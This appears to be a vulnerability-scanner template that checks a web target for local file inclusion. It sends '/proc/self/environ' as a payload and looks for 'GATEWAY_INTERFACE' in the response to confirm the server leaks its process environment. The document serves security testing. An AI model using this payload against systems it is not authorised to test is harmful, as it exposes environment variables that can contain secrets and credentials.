id: lfi7-040
name: 'Deep traversal in root'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via root'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      root:
        - '/proc/self/environ'
    matchers:
      - type: word
        part: body
        words:
          - 'GATEWAY_INTERFACE'
